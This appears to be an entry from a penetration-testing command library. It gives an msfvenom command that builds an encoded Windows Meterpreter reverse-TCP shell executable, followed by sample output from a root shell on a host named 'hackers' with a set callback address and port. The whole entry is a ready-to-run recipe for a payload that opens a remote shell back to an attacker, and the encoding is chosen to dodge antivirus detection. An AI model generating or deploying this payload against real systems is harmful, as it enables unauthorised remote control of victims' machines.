---
id: 1d9aba40-0705-46d9-a72b-15769fdd060c
name: msfvenom Windows Reverse Shell
type: command
executor: null
data: msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT
  -a x86 -e x86/shikata_ga_nai -f exe > msf.exe
output: 'root@hackers:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.162.187
  LPORT=1337 -a x86 -e x86/shikata_ga_nai -f exe > msf.exe

  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

  Found 1 compatible encoders

  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai

  x86/shikata_ga_nai succeeded with size 368 (iteration=0)

  x86/shikata_ga_nai chosen with final size 368

  Payload size: 368 bytes

  Final size of exe file: 73802 bytes'
created_at: '2019-09-17T17:46:36.380554+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[msfvenom]]'
---

# msfvenom Windows Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -a x86 -e x86/shikata_ga_nai -f exe > msf.exe
```

## Expected Output

```
root@hackers:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.162.187 LPORT=1337 -a x86 -e x86/shikata_ga_nai -f exe > msf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
```


